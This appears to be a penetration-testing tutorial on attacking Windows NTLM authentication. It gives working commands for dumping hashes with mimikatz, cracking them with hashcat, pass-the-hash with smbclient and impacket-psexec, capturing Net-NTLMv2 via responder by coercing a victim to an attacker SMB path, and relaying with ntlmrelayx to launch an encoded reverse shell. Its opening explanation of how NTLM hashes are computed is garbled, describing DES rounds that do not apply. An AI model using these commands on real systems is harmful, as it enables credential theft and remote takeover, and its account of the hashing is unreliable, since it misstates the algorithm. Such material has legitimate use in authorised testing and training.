The NTLM hash is the cryptographic format in which user passwords are stored on Windows systems. NTLM hashes are stored in the SAM (security account manager) or NTDS file of a domain controller. They are a fundamental part of the mechanism used to authenticate a user through different communications protocols. It’s, therefore, critical information and highly sought after by hostile actors when trying to unleash a cyber-attack. When pentesting, for example, it’s common for attackers to try to obtain these hashes (using tools such as pwdump or mimikatz) and use Pass The Hash techniques using NTLM hashes to exploit the privileges of one or more systems. In this way, they could execute elevated privileges and even execute commands. The NTLM hash is encoded by taking the user’s password and converting it into a 16-byte key using an MD4 hash function. This key is divided into two halves of 8 bytes each, which are used as input to three rounds of DES encryption to generate a 16-byte output that represents the NTLM hash. Each DES round uses an 8-byte key derived from the original key half using a parity operation. The two 8-byte results from the three DES rounds are concatenated to form the 16-byte NTLM hash that is used to verify the user’s password in the Windows operating system. NTLM hashes are likely to be used in many Windows authentication attacks, so it’s advisable to limit their use and use Kerberos.

### Mimikatz

[Mimikatz](https://github.com/ParrotSec/mimikatz) is a very useful tool that can do many things once executed on a Windows system, like dumping NTLM hashes of the users. As their GitHub page says, it can be run with

```powershell
.\mimikatz.exe
```

Warning: Mimikatz's commands could not work depending on the Windows version. Make sure to download the correct version after checking with `systeminfo` the Windows version.

Then, if we have the privileges, it can be used to dump NTLM hashes with

```powershell
privilege::debug
token::elevate
lsadump::sam
```

To impersonate another user

```powershell
 sekurlsa::pth /user:Administrator /domain:<DOMAI> /ntlm:<NTLM-HASH> /impersonate
```

### Cracking the NTLM hashes

The **1000** code is for NTLM hashes. The username is dump along with the hash. The cracking is done with the following code

```shell
hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt
```

The plaintext credential we will find are used in the authentication method in the Windows system, like RDP, SMB or other services, if the user has the required privileges to use that services.

### Passing the NTLM hashes

The NTLM hashes can be used also as is if the protocol supports it. An example is SMB

```shell
smbclient \\\\<TARGET-IP>\\secrets -U Administrator --pw-nt-hash <NTLM-HASH>
```

We can escalate the writables shares with `impacket-psexec`, a oneliner tool that opens a reverse shell with the exploited target.

```shell
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM-HASH> Administrator@<TARGET-IP>
```

### Cracking the Net-NTLMv2 hashes

One of the authentication protocols Windows machines use to authenticate across the network is a challenge / response / validation called Net-NTLMv2. If can get a Windows machine to engage my machine with one of these requests, we can perform an offline cracking to attempt to retrieve their password. In some cases, we could also do a relay attack to authenticate directly to some other server in the network.

Once identified our interface, we can start our interceptor with

```shell
sudo responder -I <INTERFACE>
```

And from the Victim we only need to mount as a SMB share a fake provided path

```powershell
dir \\<ATTACKER-IP>\test
```

In this way `responder` will dump the hash that could be cracked with code **5600** on hashcat

```shell
hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt --force
```

### Relaying the Net-NTLMv2 hashes

We can perform a `ntlmrelayx` attack if the gained hash is too difficult to be cracked. In this case the `<TARGET-IP>` is the second exploitable machine on the network.

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET-IP> -c "powershell -enc <ENCODED-REVSHELL>"
```

The encoded reverse shell can be crafted with some UTF-16-BE malicious code crafted with [RevShells](https://www.revshells.com/). Then, we have to gain the hash from the first machine. We can do the same attack as before, mounting on the machine 1 the fake SMB share, in order to gain the hash.

```powershell
dir \\<ATTACKER-IP>\test
```

Now we `impacket-ntlmrelayx` will pass the hash to the second machine to authenticate us with the same hash. If the user is also the Administrator of the second machine, we will be logged as Administrator.